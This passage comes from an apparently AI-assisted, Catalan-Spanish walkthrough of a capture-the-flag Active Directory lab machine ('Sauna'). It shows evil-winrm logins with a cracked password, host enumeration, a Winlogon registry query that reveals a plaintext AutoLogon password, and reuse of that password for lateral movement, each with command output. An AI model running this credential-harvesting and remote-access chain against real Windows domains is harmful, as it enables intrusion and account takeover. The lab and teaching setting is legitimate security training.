* si entra, la següent fase pasará a ser enumeració interna del sistema ja amb accés real;
* si no entra, la credencial seguirá siendo valiosa, però habrá que decidir otra via de validación compatible amb aquest usuari.

## checks

Comprovar si la sesión WinRM se establece correctament.

Si entra, verificar de inmediato el context amb checks básicas de identitat i privilegis.

Si no entra, no desechar la credencial: distingir entre “contrasenya incorrecta” i “usuari válido sense permís de WinRM”.

Mantenir `cracked_fsmith.txt` com evidència del resultat offline i no sobrescribir els artefactos previos.

## writeup_notes

La fase de ASREPRoasting no terminó simplemente amb la obtenció de un hash, sinó amb la recuperació efectiva de una contrasenya reutilitzable. Aquest momento marcal pas de una fase de abús de autenticación a una fase de validación de accés real sobre serveis remotos del sistema.

Lliçó reutilitzable: en una cadena de Active Directory, recuperar una contrasenya en clar cambial cas per completo. A partir de ahí, la prioridad deixa de ser seguir buscando usuaris i passa a ser validar, amb el menor soroll posible, en què superfície exposada aquesta credencial té valor operatiu real.

## Executem el bloc i revisem la sortida

❯ evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-WinRM#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents>


objective

Confirmar que la Credencial recuperada té valor operatiu real, tancar la fase de accés inicial i fijar una primera enumeració interna mínima, ordenada i útil per decidir la següent branca.

verified_facts

La autenticación per WinRM ha funcionado correctament.

La compte `fsmith` no només era válida en el domini, sinó també reutilitzable per accés remot interactivo al objective.

El prompt remot confirma ja un **foothold real** en la màquina:

`*Evil-WinRM* PS C:\Users\FSmith\Documents>`

Amb esto queda verificada toda la cadena prèvia:

* noms reals expuestos en la web
* derivació de usuaris candidats
* validación de la convenció `inicial + apellido`
* obtenció de hash AS-REP per `fsmith`
* Recuperació offline de la contrasenya
* accés remot válido amb `fsmith`

assumptions

La inferència principal és que `fsmith` dispone al menys de permisos suficientes per accés remot per WinRM, però encara no està verificat cuál és su nivel real dentro del sistema ni del domini.

També és raonable suponer que la següent fase útil ja no és insistir en Kerberos ni en derivació de identitats, sinó fer una **enumeració interna curta i bien enfocada** per responder tres preguntas:

* quién és exactamente aquest usuari dentro del domini
* què informació del sistema i del context AD queda visible des de aquesta sesión
* què pista dominant apareix per la següent escalada

Encara sigue pendent de verificar si el usuari pertenece a grups amb valor especial, si hi ha credencials reutilizables en el host o si existeix alguna configuración operativa interesante per pivotar a la següent fase.

method

Primer se cierra formalmente la fase de accés inicial perquè ja no és una hipótesis: existeix shell remota válida.

Després se propone una enumeració interna mínima, no infinita, orientada a context i decisió. La idea no és disparar eines a ciegas, sinó obtenir primer identitat, grups, sistema, domini i artefactos básicos del perfil del usuari.

No convé obrir encara diverses branques a la vez. Amb aquest accés, el següent pas únic correcte és una **enumeració interna básica i trazable**.

answer

Perfecto. Ja hi ha foothold real.

Aquest és el primer gran tancament tècnic de la màquina: la Credencial recuperada no era només válida en abstracto, sinó operativa sobre un servei remot exposat. Això convierte a `fsmith` en un accés inicial plenamente confirmado.

A partir de aquí cambia la lógica del cas. La branca principal ja no és “obtenir accés”, perquè aquesta fase ha terminado. La branca principal passa a ser **enumeració interna del host i del context de domini des de la sesión de `fsmith`**.

No interessa encara saltar directament a eines pesadas ni a múltiples verificaciones paralelas. El que més net és sacar primer un bloc curt de context que permita decidir la següent acción amb base real.

Quina troballa domina ara: `fsmith` proporciona accés remot interactivo válido per WinRM.

Quina branca principal continua activa: enumeració interna post-foothold en entorn Windows/AD.

Quines branques secundàries queden anotades: revisión de privilegis locals, context de domini, posibles credencials expuestas i, només després, escalada según la evidència que aparezca.

Quin és el següent pas únic: obtenir un bloc mínimo de identitat, grups, sistema, domini i flag de usuari des de la sesión actual.

commands

```powershell
whoami
whoami /groups
hostname
ipconfig /all
systeminfo
echo $env:USERDOMAIN
echo $env:COMPUTERNAME
dir C:\Users
type C:\Users\FSmith\Desktop\user.txt
```

Per què és proposen aquestes ordres:

`whoami` se usa per confirmar el context exacto del usuari autenticado. Tot i que el prompt ja suggereix `FSmith`, interessa dejar evidència explícita i reutilitzable.

`whoami /groups` sirve per ver què grups efectivos té el usuari. La senyal prèvia per usarlo és clara: ja existeix accés real i ara interessa saber si el valor del usuari està en sus pertenencias, no només en su nom.

`hostname`, `ipconfig /all`, `systeminfo`, `echo $env:USERDOMAIN` i `echo $env:COMPUTERNAME` se usan per fijar el context tècnic del host: nom, domini, versión del sistema i detalles operativos que després ayudan a interpretar cualquier hallazgo. No son commands “per rutina”, sinó per anclar la evidència del entorn abans de buscar vies de escalada.

`dir C:\Users` permet ver què perfils existeixen en el sistema. Això aporta una lectura rápida de què otros usuaris han iniciado sesión o tenen perfil local, alguna cosa molt valioso en Windows.

`type C:\Users\FSmith\Desktop\user.txt` sirve per verificar el accés al flag de usuari i tancar formalmente la fase de foothold.

Què esperamos obtenir:

* identitat exacta del usuari
* grups rellevants
* context del host i del domini
* llista inicial de perfils locals
* confirmación del user flag

Quina part de la sortida interessa realment:

* grups no triviales en `whoami /groups`
* nom del domini i versión del sistema
* perfils de servei o comptes administrativas en `C:\Users`
* si el flag de usuari és legible des de aquest context

Com canvia la decisió següent según el resultat:

* si apareixen grups o perfils interesantes, la següent fase se centrará en ellos
* si el context del sistema suggereix una via clara, se priorizará aquesta evidència
* si todo parece normal, entonces tocará passar a enumeració més profunda del host amb una eina de apoyo

checks

Comprovar que `whoami` retorna exactamente el usuari esperado i guardar aquesta evidència com tancament del accés inicial.

Revisar `whoami /groups` buscando pertenencias amb valor especial o fuera del que normal.

Anotar cualquier nom interesante en `C:\Users`, sobre todo comptes de servei o perfils que no encajen amb un usuari estándar.

Confirmar si `user.txt` és accesible des de la sesión actual, perquè això cierra de forma neta la fase de usuari.

writeup_notes

La autenticación correcta per WinRM va confirmar que la Credencial recuperada des de ASREPRoasting tenia valor operatiu real. Aquest momento marcó el fin de la fase de accés inicial i el comienzo de la enumeració interna del sistema des de un usuari de domini válido.

Lliçó reutilitzable: quan una Credencial recuperada funciona sobre un servei remot exposat, no convé saltar inmediatamente a eines pesadas. Primer merece la pena fijar identitat, grups, sistema i context del domini, perquè aquesta base ordena molt millor la següent decisió de escalada.

## Executem el bloc i revisem la sortida

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
*Evil-WinRM* PS C:\Users\FSmith\Documents> hostname
SAUNA
*Evil-WinRM* PS C:\Users\FSmith\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : SAUNA
   Primary Dns Suffix  . . . . . . . : EGOTISTICAL-BANK.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : EGOTISTICAL-BANK.LOCAL
                                       htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-94-EA-F0
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::165(Preferred)
   Lease Obtained. . . . . . . . . . : Thursday, April 23, 2026 10:52:13 AM
   Lease Expires . . . . . . . . . . : Thursday, April 23, 2026 12:52:12 PM
   IPv6 Address. . . . . . . . . . . : dead:beef::7cc2:310a:b259:9b93(Preferred)
   Link-local IPv6 Address . . . . . : fe80::7cc2:310a:b259:9b93%7(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.95.180(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, April 23, 2026 10:52:15 AM
   Lease Expires . . . . . . . . . . : Thursday, April 23, 2026 12:52:15 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:9b51%7
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 369119318
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-31-7C-14-A4-00-50-56-94-EA-F0
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb
*Evil-WinRM* PS C:\Users\FSmith\Documents> systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
+ systeminfo
+ ~~~~~~~~~~.
At line:1 char:1
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
*Evil-WinRM* PS C:\Users\FSmith\Documents> clear
*Evil-WinRM* PS C:\Users\FSmith\Documents> echo $env:USERDOMAIN
EGOTISTICALBANK
*Evil-WinRM* PS C:\Users\FSmith\Documents> echo $env:COMPUTERNAME
SAUNA
*Evil-WinRM* PS C:\Users\FSmith\Documents> dir C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/25/2020   1:05 PM                Administrator
d-----        1/23/2020   9:52 AM                FSmith
d-r---        1/22/2020   9:32 PM                Public
d-----        1/24/2020   4:05 PM                svc_loanmgr


*Evil-WinRM* PS C:\Users\FSmith\Documents> type C:\Users\FSmith\Desktop\user.txt
c06623afb7a5c08a412d732234887383
*Evil-WinRM* PS C:\Users\FSmith\Documents>

## objective

Tancar formalmente la fase de foothold amb `fsmith`, interpretar la enumeració interna ja obtenida i fijar un següent pas únic, curt i amb alt valor per la escalada.

## Fets verificats

La sesión remota amb `fsmith` funciona i el accés inicial queda plenamente confirmado.

El context exacto del usuari és:

* `egotisticalbank\fsmith`

Els grups observats no mostren, per ara, privilegis administrativos directos. El que rellevant de verdad és:

* `BUILTIN\Remote Management Users`, que explical accés per WinRM
* grups estándar de usuari autenticado
* ausencia visible de grups típicamente administrativos

El host és `SAUNA` i sigue encajando clarament com equip unido al domini `EGOTISTICALBANK`.

La lectura del flag de usuari ha funcionado, así que la fase de user queda tancada.

La sortida de `C:\Users` aporta una senyal nueva i molt important: a més de `Administrator` i `FSmith`, existeix perfil local de `svc_loanmgr`.

Aquest perfil no demuestra per sí només privilegis altos, però sí demuestra que aquesta compte ha iniciado sesión o ha tenido context local en el sistema, el que cual la convierte en una pista de molt mes valor que seguir mirando grups triviales de `fsmith`.

`systeminfo` va retornar “Access is denied”. Això és una observació real, però no cambia la lectura principal del cas ni bloquea la següent decisió.

## assumptions

La inferència principal és que `fsmith` és un usuari de baix privilegi amb accés remot permitido, però no parece ser la compte final de trabajo per la següent fase.

La pista dominant ara és `svc_loanmgr`. La existencia de su perfil local suggereix que pot tratarse de una compte de servei o de operación amb mes valor que `fsmith`.

La hipótesis de trabajo més neta és que el següent avance no saldrá de privilegis especiales de `fsmith`, sinó de **credencials o configuración asociadas a otra compte presente en el sistema**, especialment `svc_loanmgr`.

## method

Primer se toma la enumeració actual i se separal que que és contextual del que que realment cambia la decisió.

Després se evita obrir diverses branques a la vez. No convé dispersarse entre SMB, BloodHound, LDAP i otras checks encara.

La senyal més forta que ha aparecido en aquesta fase és el perfil de `svc_loanmgr`, así que el següent pas únic ha de orientarse a verificar si el sistema guarda configuración de inicio automático o credencials asociadas a aquesta compte.

## answer

La enumeració ha sido suficient per tomar una decisió clara.

El troballa dominant ja no és que `fsmith` tenga WinRM, perquè això només explica com se va obtenir el foothold. El que important ara és que `fsmith` **no mostra grups de alt privilegi**, mientras que el sistema sí revela presencia local de otra compte molt més interesante: `svc_loanmgr`.

Això cambia la dirección del cas. La branca principal deixa de ser “mirar què pot fer `fsmith`” i passa a ser **buscar si el sistema expone configuración o credencials reutilizables relacionadas amb `svc_loanmgr`**.

El següent pas únic més net és revisar la configuración de **AutoLogon** en el registre de Windows. Se propone aquesta Verificació i no otra perquè:

* part de una senyal prèvia real: existeix perfil local de una compte de servei
* és una comprobación curta
* té poc soroll
* pot revelar de forma directa usuari i contrasenya si existeix inicio automático configurado
* no obliga encara a eines més pesadas

**Quina troballa domina ara:** `fsmith` té accés remot válido, però la pista mes valiosa és la presencia local de `svc_loanmgr`.

**Quina branca principal continua activa:** enumeració interna post-foothold orientada a descubrir credencials reutilizables de una compte amb mes valor.

**Quines branques secundàries queden anotades:** privilegis locals de `fsmith`, artefactos del perfil i, més adelante, enumeració de permisos de domini si apareix una segunda credencial.

**Quin és el següent pas únic:** comprovar si el sistema guarda configuración de AutoLogon asociada a `svc_loanmgr`.

## commands

```powershell id="w6k2mz"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Se propone aquest ordre perquè la senyal prèvia ja existeix: hi ha una compte `svc_loanmgr` amb perfil local en el sistema i això justifica buscar si va quedar configurada per inicio automático.

Què fa: consulta la clave de `Winlogon`, on Windows pot almacenar parámetros com:

* `AutoAdminLogon`
* `DefaultUserName`
* `DefaultDomainName`
* `DefaultPassword`

Què se espera obtenir: o bien una configuración innòcua, o bien una combinación de valores que apunte a credencials almacenadas o a un usuari configurado per logon automático.

Quina part de la sortida interessa realment:

* si `AutoAdminLogon` està habilitado
* què compte apareix en `DefaultUserName`
* si existeix `DefaultPassword`
* si el domini asociado coincide amb `EGOTISTICALBANK`

Com canvia la decisió següent:

* si apareixen credencials o una compte clara, la següent fase será validar aquest nuevo context
* si no apareix nada útil, entonces tocará elegir otra comprobación local curta orientada a secretos o artefactos del sistema

## checks

Comprovar si en la sortida apareixen explícitamente `DefaultUserName` i `DefaultPassword`.

Anotar si el nom de usuari coincide amb `svc_loanmgr` o amb otra compte inesperada.

No sacar conclusiones per una sola clave aislada; el que important és la combinación entre `AutoAdminLogon`, usuari, domini i posible contrasenya.

Si no apareix `DefaultPassword`, no forzar encara una segunda branca gran; primer convendrá interpretar el resto de la sortida.

## writeup_notes

El accés amb `fsmith` cerró la fase de foothold, però la enumeració de grups va mostrar un usuari de perfil baix. El hallazgo verdaderamente útil va aparèixer al revisar els perfils locals del sistema: la presencia de `svc_loanmgr` sugirió la existencia de una segunda compte amb mes valor operatiu, el que que justificó una revisión dirigida de la configuración de inicio automático en el registre.

Lliçó reutilitzable: tras obtenir un foothold válido en Windows, no siempre convé centrarse en els privilegis inmediatos del usuari actual. A veces el salto real apareix al detectar otra compte presente en el sistema i comprovar si el propi host expone credencials o configuración asociadas a ella.

## Executem el bloc i revisem la sortida

*Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x8c9319f7
    ShutdownFlags    REG_DWORD    0x8000022b
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey


objective

Interpretar el hallazgo del registre, separar el que ja demostrado de la única duda que queda abierta i fijar un següent pas únic abans de cambiar de usuari.

verified_facts

La consulta al registre ha producido un hallazgo de molt valor: el sistema guarda credencials de AutoLogon en clar.

Els valores realment importants son aquests:

* `DefaultDomainName = EGOTISTICALBANK`
* `DefaultUserName = EGOTISTICALBANK\svc_loanmanager`
* `DefaultPassword = Moneymakestheworldgoround!`

Això confirma que el host expone una segunda credencial reutilitzable distinta de `fsmith`.

També queda verificat un detalle important: existeix una discrepancia entre el nom visto abans en `C:\Users` i el que apareix ara en el registre.

* en `C:\Users` va aparèixer `svc_loanmgr`
* en `Winlogon` apareix `svc_loanmanager`

La contrasenya ja no és una hipótesis. És un fet observat directament en el sistema.

assumptions

La inferència principal és que el següent salto del cas passa per aquesta segunda compte, no per elevar privilegis amb `fsmith`.

La única incertidumbre real ara no és la contrasenya, sinó el **nom exacto de la compte operativa** que ha de usarse.

La explicació més raonable és que `svc_loanmgr` sea la compte real visible en el sistema i que `svc_loanmanager` refleje una forma més llarga o una referencia asociada al AutoLogon, però això encara ha de verificarse abans de dar el següent salto.

method

Primer se tomal hallazgo del registre com evidència dominant, perquè revela una credencial en clar almacenada en el propi host.

Després se evita cometer un error típic: lanzarse a cambiar de usuari sense resolver abans la discrepancia del nom de compte.

Per això, el següent pas únic no és encara obrir una nueva sesión remota, sinó **confirmar cuál de els dos noms existeix realment com compte vàlid**.

answer

Aquest resultat és excelente.

El troballa dominant ja no és el accés amb `fsmith`, sinó que el propi sistema ha revelado una credencial adicional en clar. Això cambia per completo la fase actual: la ruta principal deixa de ser enumeració básica del usuari actual i passa a ser **validación de una segunda compte amb mes valor operatiu**.

La contrasenya `Moneymakestheworldgoround!` ja està confirmada com dato exposat en el registre. El que únic que convé resolver abans de avanzar és la discrepancia entre `svc_loanmanager` i `svc_loanmgr`.

Aquesta diferencia importa perquè un error de nom de usuari pot fer parecer inválida una credencial que en realidad és bona. Así que el següent pas únic correcte és confirmar cuál de les dos comptes existeix realment en el sistema i cuál té sentido usar per el següent accés.

Quina troballa domina ara: el sistema expone una credencial de AutoLogon en clar asociada a una compte de servei.

Quina branca principal continua activa: enumeració post-foothold orientada a validar i reutilizar la segunda credencial hallada en el host.

Quines branques secundàries queden anotades: privilegis locals de `fsmith` i revisión de artefactos del sistema, però passen a segundo pla frente a la nueva credencial exposada.

Quin és el següent pas únic: resolver el nom exacto de la compte vàlid entre `svc_loanmanager` i `svc_loanmgr`.

commands

```powershell id="q7m1de"
net user svc_loanmgr
net user svc_loanmanager
```

Per què és proposen aquestes ordres:

La senyal prèvia que lleva a usarlos és molt clara: el sistema ja ha dado una contrasenya en clar, però hi ha una discrepancia en el nom de usuari.

Què hacen:

* comprueban si cada nom corresponde a una compte real conocida per el sistema;
* ayudan a distingir entre nom operatiu real i nom només referenciado en el registre.

Què se espera obtenir:

* que uno de els dos noms devuelva informació válida de compte;
* i que el otro falle o no aporte resultats.

Quina part de la sortida interessa realment:

* si la compte existeix;
* si apareix descripción útil;
* si pertenece a grups amb valor operatiu, especialment accés remot.

Com canvia la decisió següent:

* si `svc_loanmgr` existeix i retorna informació válida, el següent pas será validar aquesta credencial en accés remot;
* si existeix `svc_loanmanager`, entonces se usará aquest nom exacto;
* si ambos apareixen, se decidirá según el que encaje amb grups i context operatiu.

checks

Comprovar cuál de els dos noms retorna informació real de compte.

Anotar si la compte vàlid pertenece a `Remote Management Users` o a otro grup amb valor práctico inmediato.

No desechar la contrasenya si uno de els dos noms falla; aquí la duda està en el identificador exacto, no en la calidad del secreto encontrado.

writeup_notes

La revisión del registre va mostrar un patrón clàssic de mala práctica en Windows: credencials de AutoLogon almacenadas en clar dentro de `Winlogon`. Aquest hallazgo desplazó la atención des del usuari inicial hacia una segunda compte amb més potencial, però abans de reutilizarla va ser necesario resolver una discrepancia entre el nom observat en el perfil local i el nom mostrado per el registre.

Lliçó reutilitzable: quan un sistema expone una contrasenya en clar, el primer impulso no ha de ser probarla a ciegas, sinó confirmar primer el identificador exacto de la compte asociada. Un petit error de nom pot ocultar una credencial perfectamente válida.

## Executem el bloc i revisem la sortida

*Evil-WinRM* PS C:\Users\FSmith\Documents> net user svc_loanmgr
User name                    svc_loanmgr
Full Name                    L Manager
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/24/2020 4:48:31 PM
Password expires             Never
Password changeable          1/25/2020 4:48:31 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home Directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\FSmith\Documents> net user svc_loanmanager
net.exe : The user name could not be found.
    + CategoryInfo          : NotSpecified: (The user name could not be found.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

More help is available by typing NET HELPMSG 2221.

## objective

Resolver la discrepancia del nom de compte, confirmar cuál és la identitat operativa real asociada a la credencial hallada i fijar el següent pas únic per cambiar a un context de usuari amb mes valor.

## Fets verificats

La discrepancia ja ha quedado resuelta.

La compte real existente en el sistema és:

* `svc_loanmgr`

La compte `svc_loanmanager` **no existeix**.

Això permet reinterpretar correctament el hallazgo del registre: la contrasenya exposada és real, però el nom mostrado en `DefaultUserName` no coincide amb el identificador operatiu válido que reconoce el sistema.

També queda verificat que `svc_loanmgr`:

* està activa
* pertenece a `Domain Users`
* pertenece al grup local `Remote Management Users` (la sortida apareix truncada com `Remote Management Use`, però el grup és reconocible)

Aquest último punt és especialment important perquè encaja directament amb una reutilització per WinRM.

## assumptions

La inferència principal és que la contrasenya hallada en AutoLogon ha de probarse amb la compte real `svc_loanmgr`, no amb `svc_loanmanager`.

La hipótesis més forta ara és que `svc_loanmgr` no només existeix, sinó que probablemente permitirá accés remot per WinRM, ja que pertenece al grup adecuado per ello.

Sigue pendent de verificar una sola cosa: si la credencial completa

* usuari: `svc_loanmgr`
* contrasenya: `Moneymakestheworldgoround!`

és operativa per obrir una nueva sesión remota.

## method

Primer se tomal resultat de `net user` per tancar la duda del identificador exacto.

Després se evita seguir enumerando amb `fsmith`, perquè la evidència ja apunta a una compte millor posicionada per continuar.

El següent pas únic correcte es validar la nueva credencial en el servei remot que ja se sabe exposat i utilizable en aquesta màquina: WinRM.

## answer

Aquí apareix el cambio important de fase.

Fins a ara `fsmith` hi havia servido com puerta de entrada i com usuari de observació. Però el sistema ha revelado una segunda credencial amb mes valor, i ara ja se sabe amb precisión cuál és el nom correcte de la compte asociada: `svc_loanmgr`.

La sortida de `net user` fa dos cosas a la vez:

* confirma que `svc_loanmgr` existeix realment
* confirma que pertenece al grup que explica una posible reutilització per WinRM

Això convierte a `svc_loanmgr` en el nuevo troballa dominant.

La branca principal ja no ha de centrarse en seguir exprimiendo a `fsmith`, sinó en **validar el salto a `svc_loanmgr`**.

**Quina troballa domina ara:** existeix una segunda compte real, `svc_loanmgr`, asociada a la contrasenya exposada i amb pertenencia compatible amb accés remot per WinRM.

**Quina branca principal continua activa:** reutilització de credencials halladas localment per cambiar a un context de usuari mes valioso.

**Quines branques secundàries queden anotades:** enumeració adicional de `fsmith` i revisión local de artefactos, però passen a segundo pla frente a la nueva credencial.

**Quin és el següent pas únic:** obrir una nueva sesión WinRM com `svc_loanmgr` usant la contrasenya hallada en el registre.

## commands

```bash id="8j2qrm"
evil-WinRM -i 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

Per què se propone aquest ordre:

La senyal prèvia és ja molt forta i està compuesta per tres piezas que encajan entre sí:

* el registre expone una contrasenya en clar
* `net user` confirma que la compte real és `svc_loanmgr`
* aquesta compte pertenece a `Remote Management Users`

Què fa:

* intenta obrir una nueva sesión remota amb la segunda credencial hallada

Què se espera obtenir:

* o bien una nueva shell remota válida com `svc_loanmgr`
* o bien un fallo de autenticación o autorización que obligue a reinterpretar el alcance de la credencial

Quina part de la sortida interessa realment:

* si apareix prompt remot
* si el usuari autenticado cambia de `fsmith` a `svc_loanmgr`
* si el error, en cas de existir, apunta a contrasenya incorrecta o a falta de permisos

Com canvia la decisió següent:

* si entra, la següent fase pasará a centrarse en els privilegis i permisos de `svc_loanmgr` dentro del domini
* si no entra, la credencial seguirá siendo rellevant, però habrá que comprovar en què superfície concreta té valor

## checks

Comprovar que la nueva sesión se establece realment com `svc_loanmgr`.

No tancar encara la sesión actual de `fsmith` fins a confirmar que la nueva funciona.

Si la nueva sesión entra, verificar de inmediato identitat i grups per comparar el nuevo context amb el de `fsmith`.

## writeup_notes

La discrepancia entre el nom visto en el registre i el nom real de la compte va quedar resuelta mediante `net user`. Aquesta comprobación evitó un error de Interpretació important i va permetre enlazar correctament la contrasenya exposada amb la compte operativa válida del sistema: `svc_loanmgr`.

Lliçó reutilitzable: quan una credencial apareix en clar però el identificador del usuari genera dudas, convé resolver primer el nom real de la compte abans de probar accés. En entornos Windows, una petita diferencia en el nom pot separar una credencial aparentment inútil de un accés perfectamente válido.

## Executem el bloc i revisem la sortida

❯ evil-winrm -i 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-WinRM#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>

## objective

Tancar el Canvi de context des de `fsmith` a `svc_loanmgr`, confirmar què valor operatiu real té aquesta segunda compte i preparar una única línea de trabajo per la següent fase de enumeració de privilegis en domini.

## Fets verificats

La autenticación per WinRM amb la segunda credencial ha funcionado correctament.

El prompt remot confirma que ara la sesión ja no pertenece a `fsmith`, sinó a:

* `svc_loanmgr`

Això valida toda la cadena intermedia:

* el registre expuso una contrasenya en clar
* la compte correcta era `svc_loanmgr`
* aquesta compte pertenece a `Remote Management Users`
* la credencial és reutilitzable per accés remot real

Amb esto queda confirmado que el salto lateral des de `fsmith` hacia `svc_loanmgr` és exitoso.

## assumptions

La inferència principal és que `svc_loanmgr` té mes valor operatiu que `fsmith`, però encara no està demostrado en què consiste exactamente aquest valor.

També és raonable asumir que el següent avance no dependerá ja de credencials locals, sinó de **permisos, delegaciones o drets dentro del domini**.

La hipótesis de trabajo més neta és que la següent fase útil será una **enumeració AD orientada a privilegis efectivos** de `svc_loanmgr`, no una revisión local genérica del host.

## method

Primer se cierra formalmente el cambio de usuari, perquè ja existeix una segunda sesión remota válida.

Després se evita volver a enumeració local trivial o a branques dispersas. La compte actual parece més interesante per su posición en el domini que per privilegis locals evidents.

Per això, el següent pas únic correcte és obtenir un bloc curt de identitat i grups des de la sesión actual per confirmar el context abans de passar a enumeració de permisos de domini.

## answer

Perfecto. Aquí sí hi ha cambio de fase clar.

`fsmith` va ser la puerta de entrada. `svc_loanmgr` és aral context de trabajo principal. Això significa que la cadena ja no gira en torno a “conseguir accés”, sinó en torno a **descubrir què pot fer aquesta compte dentro del domini**.

No convé encara saltar directament a múltiples eines o checks grandes sense fijar abans el nuevo context. El que més net és confirmar identitat i grups de `svc_loanmgr` i, amb això, decidir la següent enumeració de AD amb base real.

**Quina troballa domina ara:** `svc_loanmgr` proporciona una segunda sesión WinRM válida i passa a ser el usuari principal del cas.

**Quina branca principal continua activa:** enumeració de privilegis de domini des de una compte amb mes valor operatiu.

**Quines branques secundàries queden anotades:** revisión local del host i anàlisi residual de `fsmith`, però ambas passen a segundo pla frente al nuevo context de `svc_loanmgr`.

**Quin és el següent pas únic:** confirmar identitat i grups efectivos de `svc_loanmgr` des de la nueva sesión.

## commands

```powershell id="r4n7kx"
whoami
whoami /groups
whoami /priv
```

Per què és proposen aquestes ordres:

